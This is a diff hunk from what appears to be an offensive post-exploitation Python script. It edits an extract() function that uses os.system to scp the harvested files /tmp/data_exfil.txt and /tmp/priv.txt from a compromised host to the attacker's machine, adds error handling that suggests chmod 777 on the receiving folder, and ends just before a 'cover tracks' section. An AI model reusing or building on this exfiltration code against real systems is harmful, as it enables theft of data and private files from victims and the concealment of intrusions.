@@ -623,11 +623,15 @@ def extract(username,password,local_ip,local_port):
 
    # exfil the data files to local machine
    time.sleep(2)
-   u_root = input("### specify local username to send data to (for scp): ")
+   u_root = input("\n\n### specify local username to send data to (for scp): ")
    time.sleep(2)
-   print("\n### sending data to {}@{}/terminator/scp_output.txt... ###\n+input your local machine root password+".format(u_root,local_ip))
-   os.system("scp /tmp/data_exfil.txt /tmp/priv.txt {}@{}:/terminator/".format(u_root,local_ip))
-   print("\n*** data_exfil.txt and priv.txt sent to {}/terminator/ ***".format(local_ip))
+   try:
+      print("\n### sending data to {}@{}/terminator/scp_output.txt... ###\n+input your local machine root password+".format(u_root,local_ip))
+      os.system("scp /tmp/data_exfil.txt /tmp/priv.txt {}@{}:/terminator/".format(u_root,local_ip))
+   except:
+      print("*** error sending files to {}@{}:/terminator/\n*** specified user may not have write permissions in /terminator/ directory\n*** please specify different user or change permissions of /terminator/ on local machine with 'chmod 777 /terminator/".format(u_root,local_ip))
+   else:
+      print("\n*** data_exfil.txt and priv.txt sent to {}/terminator/ ***".format(local_ip))
 
 
 # cover tracks ###############################
